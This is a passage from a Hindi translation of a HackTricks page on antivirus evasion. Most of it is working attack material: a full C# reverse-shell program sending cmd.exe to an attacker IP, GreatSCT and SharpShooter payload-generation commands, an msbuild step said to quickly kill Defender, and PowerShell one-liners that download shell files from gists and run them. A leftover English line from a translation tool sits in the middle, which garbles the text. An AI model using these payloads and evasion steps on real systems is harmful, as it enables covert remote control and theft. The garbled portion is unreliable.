* अगर `winvnc` पहले से चल रहा है तो उसे शुरू न करें नहीं तो आप [पॉपअप](https://i.imgur.com/1SROTTl.png) ट्रिगर करेंगे। चेक करें कि यह `tasklist | findstr winvnc` के साथ चल रहा है या नहीं
* अगर `UltraVNC.ini` समान डायरेक्टरी में नहीं है तो `winvnc` को शुरू न करें नहीं तो यह [कॉन्फ़िग विंडो](https://i.imgur.com/rfMQWcf.png) खोल देगा
* मदद के लिए `winvnc -h` को चलाने से बचें नहीं तो आप [पॉपअप](https://i.imgur.com/oc18wcu.png) ट्रिगर करेंगे

### GreatSCT

इसे यहाँ से डाउनलोड करें: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Inside GreatSCT के अंदर:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
अब `msfconsole -r file.rc` के साथ **लिस्टर शुरू करें** और **xml payload** को निम्नलिखित के साथ **निष्पादित करें**:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**वर्तमान डिफेंडर प्रक्रिया को बहुत तेजी से समाप्त कर देगा।**

### हमारा अपना रिवर्स शेल कंपाइल करना

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### पहला C# रिवर्सशेल

इसे कंपाइल करें:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
इसका उपयोग करें:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
Since there is no English text that requires translation in the provided content, I cannot provide a Hindi translation. The content consists of a URL and a section heading which are not to be translated as per the instructions. If you have any other text that needs translation, please provide it.
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
ऑटोमैटिक डाउनलोड और निष्पादन:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
### C++

C# obfuscators सूची: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
### अन्य उपकरण
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### अधिक

{% embed url="https://github.com/persianhydra/Xeexe-TopAntivirusEvasion" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **cybersecurity company** में काम करते हैं? क्या आप चाहते हैं कि आपकी **company का विज्ञापन HackTricks में दिखाई दे**? या क्या आप **PEASS के नवीनतम संस्करण तक पहुँच चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) देखें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा संग्रह विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) का
* [**official PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) या [**telegram group**](https://t.me/peass) या **Twitter पर** मुझे **follow** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **hacktricks repo** में PRs सबमिट करके अपनी hacking tricks साझा करें और [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
